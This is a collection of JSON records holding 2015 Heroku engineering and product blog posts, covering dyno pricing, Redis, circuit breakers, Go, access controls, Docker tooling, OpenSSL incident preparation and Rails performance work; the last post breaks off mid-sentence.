{"website": "Heroku", "title": "New Dynos and Pricing Are Now Generally Available", "author": ["Peter van Hardenberg"], "link": "https://blog.heroku.com/dynos-pricing-ga", "abstract": "New Dynos and Pricing Are Now Generally Available Posted by Peter van Hardenberg June 15, 2015 Listen to this article Today we are announcing that Heroku’s new dynos are generally available. This new suite of dynos gives you an expanded set of options and prices when it comes to building apps at any scale on Heroku, no matter whether you’re preparing for traffic from Black Friday shoppers or deploying your first lines of code. Thanks to everyone who participated in the beta and provided feedback and bug reports. What does this mean for you? Beginning today, all new applications will run using these new dynos. You can migrate your existing paid applications to the new dynos at any convenient time until January 31, 2016, when we will sunset the traditional dynos. We will begin migrating free applications to the free dynos after July 15th, 2015. About the new dynos What are the new dynos? The new hobby dynos are perfect for when you want to have the Heroku developer experience and 24x7 uptime but aren’t looking to scale out. Hobby dynos have 512MB of RAM, never sleep, and are only $7 per dyno per month. Previously, dynos that never sleep started at $36 per month. You can build apps with 1 hobby dyno per process type, up to 10 process types. To scale out, upgrade to professional dynos, such as standard-1x . The new free dynos now allow up to 18 hours of activity in a given 24 hour period for 1 web dyno, 1 worker dyno and 1 one-off dyno started by heroku run or Heroku Scheduler. Your application on free dynos sleeps automatically during quiet periods. As long as your application sleeps when you do, you should never have to think about sleeping, but there are more details on sleeping in the Dyno Sleeping and Recharging article in Dev Center. How have we improved our existing Professional dynos? standard-1x and standard-2x dynos come with a great set of professional features for your production business applications, including the ability to scale both vertically and horizontally, application metrics, preboot and fast builds. They are priced at $25 and $50 per dyno per month for 512MB or 1GB of RAM. This reduces the per-unit price compared to the list price for our traditional dynos. The 750 free dyno-hour credit that used to be available on traditional dynos is no longer available. standard dynos never sleep, and include all hobby features. performance dynos isolate your app from other apps and dynos for more resources, consistent performance and superior tail latencies for your high traffic, “XL” applications, priced at $500 per dyno per month. performance dynos come with all standard features. These new dyno types prices are listed monthly so you can easily estimate your costs while still benefitting from pay as you go pricing, prorated to the second. As an example, if your app runs on a standard-1x dyno for 1 day in a 30 day month, you pay only (1/30) * $25 = $0.83. Grandfathering and Migration Existing paid applications can be migrated at any convenient time between now and January 31, 2016. Most paid applications will see savings by switching to the new dynos, and with the dynos entering general availability today, we encourage you to migrate at your earliest convenience. While we encourage you to migrate before then, we will automatically migrate any remaining applications after that date. Existing Heroku Enterprise customers will be automatically upgraded to the new professional dynos later today, June 15th, 2015. Existing free applications will be migrated to use the new free dynos beginning on July 15th, 2015. Almost all free applications on the platform will continue to run as they always have on the new dynos. Some applications will need to either upgrade to hobby or remove keep-alive code or services in order to maintain continuous operations. Applications which manage to sleep for at least six hours per day will always wake up to serve requests. For a detailed explanation of how sleeping works, see the Dyno Sleeping and Recharging article in Dev Center. In order to ease this transition for our users, until August 15th, 2015 free dynos will  receive warnings when they are active for more than 18 of the last 24 hours. Beginning on August 15th, applications which repeatedly exceed their usage quota will need to “recharge” and sleep for six hours. When an application is recharging, it will not be able to send or receive traffic, and it will not be able to run one-off dynos. No charges will accrue due to usage of free dynos at any time, and users can upgrade to hobby dynos to resume service immediately. In addition, each application will receive warnings on up to three separate days per month before they need to “recharge”. Conclusion We’re really excited to be able to bring these new dynos to you. We’ve received lots of great feedback from the developer community during our beta period and we hope these new dynos will serve you well no matter what stage your application is at. As always, if you have feedback let us know . dynos free hobby professional", "date": "2015-06-15,"},
{"website": "Heroku", "title": "Heroku Redis GA and Introducing Heroku Data Links", "author": ["Rimas Silkaitis"], "link": "https://blog.heroku.com/heroku-redis-ga-and-introducing-heroku-data-links", "abstract": "Heroku Redis GA and Introducing Heroku Data Links Posted by Rimas Silkaitis June 25, 2015 Listen to this article Today we’re pleased to announce general availability of Heroku Redis with a number of new features and a more robust developer experience. By giving developers a different data management primitive, we’re helping them meet the needs of building modern, scalable applications.  The classic example of using multiple data stores in an application is the e-commerce site that stores its valuable financial information in a relational database while the user session tokens are saved in a key-value store like Redis.  This is one of the use cases where Redis has proven to be instrumental in solving problems like caching, queuing and session storage, just to name a few . In addition to making Heroku Redis generally available, we’re pleased to introduce something new: Heroku Data Links.  The explosion of applications and distributed application architectures -- things like microservices and service-oriented architectures -- means that now more than ever, developers and organizations have valuable data living in disparate data stores.  The truly transformative applications and organizations are the ones that can quickly pull all of the data across all of their heterogeneous data stores such as Redis and Postgres, to provide insights back to their own customers or internal users.  Heroku Data Links gives developers all of the benefits of data federation across multiple data sources without the hassle of building out a new system.  Information is pulled across data stores on-demand via SQL, allowing developers or anyone in the organization to draw insights quickly and easily. What’s New in Heroku Redis Over the course of the public beta, we learned from developers that a great Redis service rests upon three pillars: a great developer experience, security, and high availability. Developer Experience: One of our core beliefs is that developers do their best when the tools they use are succinct, elegant and easy to use. We introduced the first of these features at Heroku Redis public beta, performance analytics and metrics logs. We’re extending the developer experience for GA by introducing command latencies. Latencies in Redis are very critical because data access within Redis should be extremely fast.  Command Latencies allows developers to determine bottlenecks in their applications for any number of reasons.  For example, a process could be creating key-value pairs that contain large amounts of data, thereby slowing down the entire Redis instance. With the Heroku Redis dashboard, this is easy to spot. Security: Securing your data is something that we, at Heroku, take very seriously. To make sure that developers have a secure Redis to work with, we’re requiring everyone that wants to connect to Redis install the Stunnel buildpack.  This will create an SSL connection between the dyno and the Heroku Redis instance, securing your data in-flight.  The benefit of this approach is that it creates a trusted environment for Redis to operate within, requires very little application configuration and no changes to your code.  You’re free to use the preferred Redis client library for your programming language knowing that security is already taken care of. High Availability: One of the biggest requests we got during the public beta was high availability, and we agree it plays a crucial role in running Redis in production.  We have implemented a redundancy strategy that allows for the lowest possible latencies while making HA transparent to the developer.  Heroku Redis uses a master-standby strategy much like Heroku Postgres.  In the event of a catastrophic failure of your master Redis instance, Heroku Redis will automatically fail over to the standby.  Your dynos will then get updated Redis connection information ensuring migration of client connections to the new master.  We’ll then do the work of setting up another standby and getting it caught up to the new master.  We chose this approach because it has been battle tested over the years on our Postgres product, which has successfully performed hundreds of failovers and saved our customers many days of downtime. We have also been very focused on bringing a full range of pricing options to complement the well rounded developer experience of Heroku Redis. When you provision a production-tier Heroku Redis plan, you’ll get everything, including security, performance analytics and high availability.  Production-grade plans start at $15 for a 50MB instance and go up to $1,450 for a 10GB. Heroku Redis can meet the needs of your high scale applications -- if you need  something bigger than 10GB, contact us .  We’re happy to help. Even though Heroku Redis has production-class plans with associated prices, we are going to continue to provide a free tier for anyone looking to prototype or experiment with Redis as part of the application stack.  Some of the differences between production plans and our free plan is that the free one does not come with TLS encryption between your app and your Redis instance, high availability guarantees, and some of the dashboard features.  The free dev plan is perfect for non-critical hobby apps. Introducing Heroku Data Links Data is one of the most valuable assets that an application or business has.  Increasingly, this asset can live in multiple Postgres databases or in a different data system entirely.  To unlock real value, the data needs to be aggregated, transformed and refined to provide valuable insights to customers and internal users.  That process has traditionally encompassed an Extract, Transform, and Load (ETL) program to pull data across all sorts of systems into a data warehouse that aggregated all of the information.  The problem with that setup is that you have to invest time and money into a process that isn’t very agile for generating results, and often requires specialized skill. Heroku Data Links uses a single Postgres database to federate data across other data stores, like Redis, to give developers all of the benefits of data federation without the hassle of building out a new system. Paired with Dataclips , this feature can provide sharable data insight within your organization and across data stores. Under the Hood To accomplish data aggregation without the costly data extraction processes, we’ve used a native feature of Postgres called Foreign Data Wrappers (FDW). An FDW affords a developer the ability to specify a foreign server, which could be a Redis instance, and the logical representation of foreign tables and map them to tables in the local database.  When you write a query against data in a remote database, Postgres will automatically query the remote data in a process transparent to the developer, allowing you to join it with local data.  The details of where the data lives and how it’s abstracted in the system are pushed down into the Postgres extension that connects the two data stores.  All you need to know is SQL and the table definitions and you can start federating data. While Postgres has had FDW built-in since version 9.1, we wanted to make FDW easier to use by building a great developer experience on top of it.  Heroku Data Links takes care of all of the difficult parts of managing the relationships between data stores.  You can add and remove links quickly and easily and we’ll even take care of mapping the tables between the remote data store and the local database.  On top of that, we’ll put each link that’s created in its own distinct schema within Postgres so that you don’t have to worry about naming collisions. Getting Started Starting today, newly provisioned Heroku Postgres databases, starting at Postgres version 9.4 and above, come with Data Links baked in.  We’ve installed the appropriate extensions so that you can use a Heroku Redis instance as a remote system.  Let’s run through an example using a fictional e-commerce application to illustrate how to connect our data stores together. Linking Heroku Redis to Heroku Postgres Let’s say, in our e-commerce application, that we’re storing important financial information in Heroku Postgres and session data in Heroku Redis.  With Heroku Data Links, we can integrate the data from these two systems so that it’s easy to see the profiles of users, living in Postgres, who have signed into the site in the last few hours by joining session data in Redis.  In the example below, the local database is HEROKU_POSTGRESQL_CERULEAN while the remote data store is HEROKU_REDIS_PINK : $ heroku pg:links create HEROKU_REDIS_PINK HEROKU_POSTGRESQL_CERULEAN -a sushi A Full Data Analysis Stack At Your Disposal The best part about linking all of your disparate data sources together via Heroku Data Links is that you’ll get access to Dataclips .  Heroku Dataclips is a lightweight tool that allows your team to better share, reason about and ask questions of the data you keep in each of your data stores.  Fortune 500 companies spend months and years building software and databases to federate data to garner insights.  With the one, two punch of Data Links and Dataclips, you’ll have a fully baked analytics solution in a fraction of the time. Looking to the Future We’re very excited to bring our operational expertise to running a Redis service that developers can trust as well as level the playing field by reducing the time-to-value for garnering insights with Heroku Data Links.  We have many more features and experiences that we plan on building for both products now and into the future.  If you have any suggestions of what you’d love to see us build or even just to reach out and tell us how you’re using Data Links, email us ! heroku-redis redis heroku-data-links data-federation", "date": "2015-06-25,"},
{"website": "Heroku", "title": "Improved production stability with circuit breakers", "author": ["Pedro Belo"], "link": "https://blog.heroku.com/improved-production-stability-with-circuit-breakers", "abstract": "Improved production stability with circuit breakers Posted by Pedro Belo June 29, 2015 Listen to this article Fun fact: the Heroku API consumes more endpoints than it serves. Our availability is heavily dependent on the availability of the services we interact with, which is the textbook definition of when to apply the circuit breaker pattern . And so we did: Circuit breakers really helped us keep the service stable despite third-party interruptions, as this graph of p95 HTTP queue latency shows. Here I'll cover the benefits, challenges and lessons learned by introducing this pattern to a large scale production app. A brief reminder that everything fails Our API composes over 20 services – some public (S3, Twilio), some internal (run a process, map DNS record to an app) and some provided by third parties (provision New Relic to a new app). The one thing they share in common is failure: Amazon operates some of the most reliable services we consume, and yet if you make enough calls you'll see a request hanging for 28s. If there's one thing I learned operating a large-scale app for years is to just expect incredibly high tail latencies, 500s, broken sockets and bad deploys on fridays. Circuit breaker basics Fuses and circuit breakers were introduced to prevent house fires: when electrical wiring was first being built into houses, people would sometimes plug too much stuff into their circuits, warming up the wires – sometimes enough to start a fire. Circuit breakers automatically detect this destructive pattern of usage, and interrupt the system before things get worse. So the idea with the software pattern is to wrap external service calls and start counting failures. At a certain threshold the circuit breaker trips, preventing any additional requests from going through. This is a great moment to fallback to cached data or a degraded state, if available. Both sides can benefit from this: your app becomes more stable as it saves resources that would otherwise be spent calling an unresponsive service – and the receiving end will often be able to recover faster, as it doesn't have to handle incoming traffic during outages. Implementation I maintain a Ruby gem called CB2 to implement circuit breakers in Redis : breaker = CB2::Breaker.new(\n  service: \"aws\"       # identify each circuit breaker individually\n  duration: 60,        # keep track of errors over a 1 min window\n  threshold: 5,        # open the circuit breaker when error rate is at 5%\n  reenable_after: 600, # keep it open for 30 seconds\n  redis: Redis.new)    # redis connection it should use to keep state Once a circuit breaker is defined, you can use it to wrap service calls and handle open circuits: begin\n  breaker.run do\n    some_api_request()\n  end\nrescue CB2::BreakerOpen\n  alternate_response() # fallback to cached data, or raise a user-friendly exception\nend Constant vs percent-based breakers The reason I wrote this gem is because all circuit breakers in Ruby tripped after a specified error count. While simpler, these breakers just don't scale well in production: make 10x more calls, and your circuits will open 10x more often. Avoid this by specifying the threshold as a percentage, which is in fact what Netflix uses. Deploying and monitoring your breakers Enough talk about what are circuit breakers and how they're implemented. Just like every other operational pattern, you should expect to spend only a fraction of your time writing code. Most of the effort goes ensuring a smooth deploy, and monitoring your production stack. Roll-out strategy Introduce logging-only circuit breakers at first. You'll want to review and tweak their parameters before affecting production traffic. Expect to run into surprises. In particular with internal APIs, where availability might not be as well defined or understood, you might see breakers changing state often. This is a great time to bring visibility into failures to other teams in your ecosystem. Monitoring You obviously want to know when a breaker trips. For starters this could be as simple as sending an email to the team, although in the long-term the best way to go is to inject circuit breaker state changes to your monitoring infrastructure. At Heroku we use Librato extensively. Their graph annotations are a great way to store circuit breaker changes together with any system-wide changes you might have, like deployments: But beware of race conditions when capturing circuit breaker state changes! CB2 and all of the libraries I've seen do not guarantee that only a single process will detect the state change. You'll want to use a lock or similar mechanism to avoid sending duplicated emails or annotations when circuit breakers trip under heavy traffic. Timeout early, timeout often Services operating slowly are often more damaging than services failing fast, so in order to get the most of this pattern you'll want to specify timeouts for all service calls. And be explicit about them! most HTTP libraries have timeouts disabled or set really high. By the time you start seeing one-minute timeout errors in your logs you're probably already dependent on slow responses, which is a big part of the problem here: introducing and lowering timeouts in large-scale apps can be quite challenging. You should also prefer timeouts set as close to your network library as possible, be it Postgres, Redis, AMQP or HTTP. At least in Ruby the generic timeout is just unreliable and should be used only as last resource. Further reading Martin Fowler on CircuitBreaker Release It! by Michael Nygard has an excellent chapter on breakers and other stability patterns api monitoring", "date": "2015-06-29,"},
{"website": "Heroku", "title": "Go support now official on Heroku", "author": ["Craig Kerstiens"], "link": "https://blog.heroku.com/go_support_now_official_on_heroku", "abstract": "Go support now official on Heroku Posted by Craig Kerstiens July 07, 2015 Listen to this article Today, we're excited to introduce Go as the newest officially supported language on Heroku. Over the last 2 years we’ve fallen in love with Go, an expressive, concise, clean, and efficient language with built-in concurrency, making it easy to write and maintain network services, microservices and high-traffic API endpoints. Now when writing Go you can leverage Heroku’s great developer experience and platform to quickly build apps your users can depend on. This includes the familiar git push heroku master , review apps , metrics within your dashboard , and much more. As you'd expect, Heroku doesn't introduce any changes to your Go application runtime or dependencies. Your code is entirely yours and works seamlessly with many of the open tools in Heroku’s large ecosystem . Add-ons such as Postgres and Redis allow you to select services and tools without being locked into proprietary APIs. In addition to everything Heroku provides above, official Go support includes: Fast support and testing for new versions of the language, key frameworks/libraries & tools Notifications for critical vulnerabilities affecting your application Support for issues as well as availability of premium support Read on for more or get started with Go on Heroku now . We've seen the Go community buildpack grow for some time and during this time we’ve heavily embraced it ourselves, including building parts of our platform in Go: Log Delivery System Metrics Collection & Reporting Metrics Extraction CLI and more Beyond using it ourselves we’ve engaged deeply with the community over the years. This includes contributing to the core of Go and key libraries such as pq, which ensures Go has a great package for supporting Postgres. If you’re wondering why Go is our latest in officially supported languages , here’s a bit of background on the features that we find particularly attractive and compelling for adding Go to your developer toolbox. Concurrency Concurrency is where Go shines, providing two native building blocks: goroutines and channels. Goroutines provide lightweight, concurrent function execution, multiplexed across the configured number of CPUs. Each goroutine starts with a small stack, 2k bytes in size, that grows and shrinks as needed. They are as simple to use as go f(x), where f() is a function that will then run concurrently with whatever comes after. Channels are a typed conduit used to communicate values between goroutines. The go mantra is “ Do not communicate by sharing memory; instead, share memory by communicating ”. Channels are by default unbuffered, meaning synchronous and blocking. They can also be buffered, allowing values to queue up inside of them for processing. Multiple goroutines can read/write to the same channel at the same time w/o having to take locks. Standardized formatting Go has a standard code format and a tool to organize code into that format, putting an end to debates about tabs vs. spaces, punctuation placement, etc. The tool, go fmt , produces code that is uncontroversial as well as easier to read, write and maintain. Standard Library Go’s standard library is extremely comprehensive, providing a fairly complete, generally well thought out set of abstractions for everything from archive manipulation to cryptography, databases, image manipulation, network services (including HTTP clients and servers), testing and unicode support. Built-in Profiling Go comes with tooling that enables profiling via HTTP , enabling you to determine where your application is spending time, allocating resources or blocking. The next release of Go (1.5) will also include high resolution execution tracing . Get started If you are new to the Go language, take a look at our Getting Started With Go On Heroku guide. \nExperienced Go developers will want to start with our Deploying Go Apps to Heroku guide. Signing up for a Heroku account to try Go is simple and you can get started for free .", "date": "2015-07-07,"},
{"website": "Heroku", "title": "Managing apps and users with fine-grained access controls ", "author": ["Balan Subramanian"], "link": "https://blog.heroku.com/managing_apps_and_users_with_fine_grained_access_controls", "abstract": "Managing apps and users with fine-grained access controls Posted by Balan Subramanian July 09, 2015 Listen to this article In February, we announced Heroku Enterprise , with collaboration and management capabilities for building and running your app portfolio in a governable and secure way on Heroku.  We also introduced fine-grained access controls with app privileges as a beta feature.  Today, we are pleased to announce general availability of this feature: Heroku Enterprise accounts are now automatically enabled for fine-grained access controls. We're very happy to deliver this feature that many of our largest customers have requested. \"Enterprises need greater visibility around applications and scalability, and Heroku Enterprise adds those features to the core Heroku value proposition,\" said Matthew Francis, Director Platform & Mobility, PwC. \"Over the years, I've worked on many highly complex enterprise Salesforce projects. I'm excited to have Heroku Enterprise available to me for my next one.\" Managing access to apps When you have several developers working on different apps in your company, you often need to carefully manage the level of access each person has on each app. Sometimes this is because you want to guard and monitor changes to your production apps, while enabling wider collaboration on other apps. Or, you may have both 3rd party developers and your own employees working on apps, and you want precise control over which apps each has access to. Also, you may want to manage the kinds of resources that different users have access to, such as dynos, configuration or add-ons. In a Heroku Enterprise organization, you can use roles and app privileges to manage access at different levels of granularity. Roles. Each user is assigned one of two organization roles -- member or admin. Members can see all the apps in the organization and by default have read-only access to them. Admins are able to add new members to the organization, manage access to applications, configure org-wide settings including billing, and view resource usage across apps in the organization. App privileges. With fine-grained access controls, we introduced privileges that you can apply to each member and non-org user on a per-app basis. Each privilege represents a set of permissions that enables certain actions, specifically on apps. We designed these privileges with an eye towards the different actions that various users, including developers and administrators, typically need to take as they create, build, run and maintain apps. Each user can be granted any combination of privileges on an app; this gives you more control over the full set of actions that they can perform on each app. \"Heroku Enterprise's Fine Grained Access Controls have given our administrators deeper control over our applications, while broadening collaboration across our globally distributed development teams.\"-Leela Parvathaneni, Sr Manager, Doctor Portal, Align Technology Customizing access to apps Org members and non-org collaborators can be granted any combination of the following privileges on an app: View: See basic app information and access details Deploy: Full access to its code, configuration and free add-ons Operate: Work with configuration and other operational aspects of the app Manage: Manage access to the app and its lifecycle Privileges are independently assigned (or revoked) and do not automatically include other privileges. The app privileges and allowed actions reference in the Dev Center lists all actions that each privilege enables. Enabling a user with different capabilities on different apps Beyond the default read-only access that all members get, members and app collaborators can be granted different privileges on apps based on the maturity, criticality and security posture of those apps. For example, a developer may be granted just the deploy and operate privileges on the staging version of an app, but only the view privilege on the production app.  That same developer may be granted deploy and operate privileges on a different, but less business-critical, production app. The managing organization users and application access Dev Center article provides more details how you can set up varying kinds of access for users on different apps. Delegating administration When members create or transfer in apps, they are automatically granted all privileges on those apps. They can independently manage access to the app by selectively granting other members selected privileges. Members with the manage privilege on an app can also grant manage privileges to other members, thereby delegating or sharing accountability for that app. Organization admins automatically get all privileges on all apps. While they can also grant app-specific privileges on any app, they don’t bottleneck access to apps. This way, access can be managed autonomously, improving productivity and accountability while not sacrificing centralized visibility. Greater visibility towards better governance In addition to visibility into the usage and operational aspects of their applications, organizations need to continuously ensure that they are compliant with their policies and security standards. On Heroku, administrators and application owners can quickly see who has access to an app.  In the dashboard, they can also see which exact privileges, each user has on the app. They can quickly manage access to that app by adding or removing specific privileges without impacting access to other apps. What’s next Fine-grained access controls are now enabled by default on all new Heroku Enterprise accounts and will be rolled out to all existing Heroku Enterprise accounts in the next couple of weeks. We are also working on new constructs and features that enable different development flows while keeping access management intuitive and efficient. We look forward to your feedback; email us at enterprise-feedback@heroku.com . Enterprise access controls privileges roles rbac", "date": "2015-07-09,"},
{"website": "Heroku", "title": "Heroku Connect:  Now with Free Salesforce API Calls ", "author": ["William Gradin"], "link": "https://blog.heroku.com/heroku_connect_now_with_free_salesforce_api_calls", "abstract": "Heroku Connect:  Now with Free Salesforce API Calls Posted by William Gradin July 14, 2015 Listen to this article Heroku Connect provides seamless data synchronization between Heroku Postgres databases and Salesforce organizations. Without writing a single line of integration code, you can sync hundreds of millions of Salesforce records in near real time using a simple point-and-click UI.  Resiliency and data consistency are assured with robust automatic error recovery and easy to use Salesforce centric logging capabilities. We’re pleased to announce that beginning July 2, 2015, Heroku Connect’s data synchronization with your Salesforce organization -- which relies on the SOAP API -- will no longer be constrained by your Salesforce API usage limits .  Customers can now focus on using Heroku Connect to build apps spanning Salesforce/Heroku without worrying about the volume of API calls. Heroku Connect also uses the Salesforce Bulk API for initial loads, reloading and polling for operations involving more than 20,000 records. For example an initial load of an object with 1M records would use: 1 SOAP call (free): to see how many records, and thus which API to use 4 Bulk calls (free) to retrieve data in batches of 250K February 13, 2017 update: Salesforce Bulk API calls made by Heroku Connect are also free. A key benefit of Heroku Connect is that it makes intelligent decisions about how to interact with the Salesforce APIs allowing developers to focus on writing great apps rather than having to spend time writing complex Salesforce integrations. See the Dev Center for more information on how Heroku Connect intelligently integrates with Salesforce APIs to take full advantage of free SOAP API calls. Other recent Heroku Connect improvements include: Sync Explorer :  Click on any mapping to see record level synchronization status and details of any synchronization errors by record. Salesforce Event Log and Webhooks (Beta):  Click on “Connection Settings” to create a webhook for any Salesforce + Postgres connection.  Get a real time callback whenever data changes in Salesforce are synchronized to Postgres via Heroku Connect. Note: This feature has since been deprecated and is no longer available. Heroku External Objects : Heroku Postgres databases are one of the many data sources that can be made available inside a Salesforce organization via reference. Architects can choose which data to show, and which data to sync. See this blog post for more detail. You can try out Heroku Connect by provisioning the Heroku Connect add-on using the free Demo Edition plan. Alternatively, check out the Getting Started on Heroku with Heroku Connect tutorial. Force.com Heroku Connect", "date": "2015-07-14,"},
{"website": "Heroku", "title": "Preparing for Major Response", "author": ["Kevin Thompson"], "link": "https://blog.heroku.com/preparing-for-major-response", "abstract": "Preparing for Major Response Posted by Kevin Thompson July 29, 2015 Listen to this article Earlier this month, the OpenSSL project team announced that three days later it would be releasing a new version of OpenSSL to address a high-severity security defect. In the end, this vulnerability resulted in another non-event for our customers , but we thought it might be useful and informative to share the process we went through to prepare for the issue. Triage The announcement from the OpenSSL project team only said that a vulnerability would be patched, but kept the specifics of the vulnerability embargoed to limit the likelihood of an attack before they could release their patch. Obviously, it’s difficult to gauge the potential impact of a vulnerability when you don’t know the details. A good place to start is by identifying the places where you have any exposure and the criticality of those systems. Heroku’s exposure to OpenSSL vulnerabilities is much less than you might expect. Obviously, we have a lot of clients that use SSL in the applications we host, but the SSL endpoint in those cases is an ELB provided by our underlying infrastructure provider AWS. We were already prepared and in communication with Amazon should the ELBs need patching and would work with them to determine that rollout. We considered cases where an application becomes an SSL client for one reason or another and the likelihood that an attacker could act as a man-in-the-middle. We also had to evaluate the encrypted connections to our database servers, and until we knew what kind of bug had been discovered in OpenSSL we had to consider some worst-case scenarios; for example,  a Remote Code Exploit that could put client data at risk. We finished our analysis with action items to update our stack images and an agreed-upon priority for various systems. Assign teams After the initial triage we started assigning the action items we identified to various engineering teams within Heroku. All of the engineers at Heroku were notified that the patch was coming, and the security team reached out to managers in various groups to make sure that explicit responsibility for carrying out the action items was assigned ahead of time. Much of what we needed to do was already outlined in our normal incident response process, it was just a matter of applying that process to this incident. As part of that process developed a communication plan. We also explicitly laid out how we would communicate with each other during the response, what criteria would make this an all-hands-on-deck incident, and who would get paged when it was time to swing into action. This is all part of our normal incident response process , just done in advance. The security team was tasked with searching for any new information about the vulnerability and being awake early on the day the patch was scheduled to be released. Members of all the teams were notified to be available in case this turned out to be an all-hands-on-deck moment. Game day The updated version of OpenSSL and details about the vulnerability came out around 8am Central time on Thursday July 9th. The security team saw the notification and began to re-triage the vulnerability with the new information provided. It turned out this was not an RCE and it was not a server-side vulnerability. Thus the worst scenarios (and the largest amount of remediation work) were ruled out and we decided that we didn’t need to trigger an all-hands. A couple hours after the details came out, the Ubuntu security team released a bulletin indicating that neither of the Long Term Support (LTS) versions of Ubuntu were affected by this vulnerability. Since all of Heroku production is using LTS this meant that we dodged the bullet and no further action was necessary on our part. Was it all for naught? We didn’t put a burdensome amount of time and effort into preparing for this vulnerability, but it did distract from the regular work we had planned for the week. In the end, we performed no work to remediate the vulnerability. Was it all just a waste? Absolutely not. Without a crystal ball to know which vulnerabilities will directly affect us and their impact to our customers, this kind of preparation makes sense. By planning for an event of unknown severity we were able to exercise our response process and spend some time reviewing our areas of exposure and our communication plans. While we expended some time and effort on it, should there have been something we did have to address we would have been able to do so in a prompt and responsive manner ensuring customer apps and data were kept safe. uptime", "date": "2015-07-29,"},
{"website": "Heroku", "title": "Docker support updates: Local data stores and more languages", "author": ["Michael Friis"], "link": "https://blog.heroku.com/docker_updates_local_data_stores_and_more_languages", "abstract": "Docker support updates: Local data stores and more languages Posted by Michael Friis August 18, 2015 Listen to this article Today we're releasing some exciting improvements to the Heroku beta Docker support announced 3 months ago : Automatic configuration of local containers running data stores (like Postgres, Redis and MongoDB) and support for many more languages including images for Node.js, Ruby, Go, Java, Scala, Clojure and Gradle. This helps you use local containers to run, test and deploy Heroku apps that have complex service dependencies with minimal setup and configuration. Heroku Docker support brings to your machine the Linux containerization technology that we have operated for many years. These local Docker containers make on-boarding, development and testing of apps simpler and faster, and with Docker Compose, you can quickly spin up apps consisting of multiple containers and services. With the new tools announced today, you can use Docker to test, run and deploy Heroku apps faster and more reliably. We can’t wait to see what you build. How to use Make sure you have an updated version of Heroku Toolbelt , a working Docker installation and the heroku-docker plugin installed: $ heroku plugins:install heroku-docker Grab a sample app: $ git clone https://github.com/heroku/ruby-getting-started\n$ cd ruby-getting-started Have the plugin configure your local Docker development setup: $ heroku docker:init\nWrote Dockerfile\nWrote docker-compose.yml The init command determines which Docker images are required for your app by reading the 'image' and 'add-ons' keys from app.json. It combines this with the processes from your Procfile to create and link together the Docker services for your local development environment. You're now ready to run your app locally, including a Postgres container: $ docker-compose up web\nrubygettingstarted_herokuPostgresql_1 is up-to-date\nStarting rubygettingstarted_web_1...\nAttaching to rubygettingstarted_herokuPostgresql_1, rubygettingstarted_web_1\n... You can now try out the app, running on your machine: $ open \"http://$(docker-machine ip default):8080\" Note how you don’t have to download, install and configure Postgres (or Redis if that had been required). You don't even need to worry about installing the right Ruby version: It comes installed on the Cedar-14 based Ruby image maintained by Heroku . And, when you move to another codebase, you can quickly spin that up in a new set of isolated containers. You can be confident that they're built with the right language version, running the correct database release. And you don’t need to worry about stomping on test data or config related to the first app. Because you're testing in Linux containers based on Heroku's stack image, you get high fidelity dev/prod parity with your app's production environment on Heroku, letting you catch bugs and discrepancies before deploying. Once your app is ready, you can use the plugin to deploy to Heroku: $ heroku create\n...\n$ heroku docker:release\n...\n$ heroku open When you invoke heroku docker:release , the plugin creates a Heroku-compatible slug and deploys it to Heroku. The plugin also ensures that any add-ons found in app.json , but not on the Heroku app are added before release. Check out the Dev Center documentation for details on what languages are supported and for more on how to use the Heroku Docker tools with code that you maintain. Summary We're excited to see how Docker is bringing the power of containers from platforms like Heroku to developers' laptops. At Heroku, we'll continue to leverage Docker to help you quickly get started on and switch between codebases built with the many languages and add-ons that our platform supports. Don't hesitate to send feedback to local-docker-dev@heroku.com or participate in development on GitHub . You can also sign up for updates on the Heroku beta site .", "date": "2015-08-18,"},
{"website": "Heroku", "title": "Patching Rails Performance", "author": ["Richard Schneeman"], "link": "https://blog.heroku.com/patching-rails-performance", "abstract": "Patching Rails Performance Posted by Richard Schneeman August 05, 2015 Listen to this article In a recent patch we improved Rails response time by >10% , our largest improvement to date. I'm going to show you how I did it, and introduce you to the tools I used, because.. who doesn’t want fast apps? In addition to a speed increase, we see a 29% decrease in allocated objects. If you haven't already, you can read or watch more about how temporary allocated objects affect total memory use . Decreasing memory pressure on an app may allow it to be run on a smaller dyno type, or spawn more worker processes to handle more throughput. Let's back up though, how did I find these optimizations in Rails in the first place? A year ago Heroku added metrics to the application dashboard. During the internal beta, one of the employees building the product asked if they could get access to my open source app, codetriage, because it was throwing thousands of R14-out of memory errors a day. This error occurs when you go over your allotted RAM limit on Heroku (512 mb for a hobby dyno). Before metrics, I had no clue. As the feature was made available to customers,  they became  acutely aware that their apps were slow, used lots of swap memory, and threw errors right and left. What should they do to get their apps back in shape? Initially we recommended reducing the number of web worker processes. For example if you were running 3 Unicorn workers (our recommended webserver at the time) we might suggest you decrease it to 2. This solved the problem for most people. Exposing the RAM usage helped tremendously. Still, customers reported \"memory leaks\" and overall they weren’t happy with their memory use. When our largest customers started to ask questions, they landed on my desk. It wasn't long before a customer came forward with an app that performed normally on the surface but started to swap quickly. With the owner's permission I was able to use their Gemfile locally, and started to write a series of re-useable benchmarks to reproduce the problem. A concept similar to my benchmarking rack middleware article, since Rails is a Rack app. I worked on the original concept with Koichi . We were able to isolate that particular issue to a few problematic gems that retained a large amount of memory on boot. Meanwhile Sam Saffron was writing some amazing posts about debugging memory in discourse which eventually spawned memory_profiler . I added the memory_profiler to derailed benchmarks , this is eventually what I used to find hot spots for this performance patch. I'm responsible for maximizing Ruby developer happiness on Heroku. This can mean writing documentation, patching the buildpack to stop pain points before they happen, or working upstream with popular open source libraries to resolve problems before they hit production. The longer I look at slow code or code with a large memory footprint, the more I see these things as reproducible and ultimately fixable bugs. As I was seeing issues in customer's reported apps and in some of my own, I went to the source to try to fix the issues. $ derailed exec perf:objects I ran this benchmark against my Rails app, identified a line that was allocating a large amount of memory, and refactored. In some cases we were using arrays only to join them into strings in the same method, other times we were duplicating a hash before it was merged. I slowly whittled down the allocated object count. Allocating objects takes time. If we modify an object in place without creating a duplicate, we can speed up program execution. Alternatively, we can use a pooled object like a frozen string that never needs to be re-allocated. The test app, codetriage.com, uses github style routes which requires constraints and a \"catch all\" glob route . Applying these optimizations resulted in a 31% speed increase in url generation for a route with a constraint: require 'benchmark/ips'\nrepo = Repo.first\n\nBenchmark.ips do |x|\n  x.report(\"link_to speed\") {\n    helper.link_to(\"foo\", app.repo_path(repo))\n  }\nend The routing improvements combined with all the other savings gives us a speed boost of more than 10%. The best part is, we don't have to change the way we write our Rails app, you get these improvements for free by upgrading to the next version of Rails. If you're interested in where the savings came from, look at the individual commits which have the methodology and object allocation savings for my test app recorded. Working with Rails has made me a better developer, 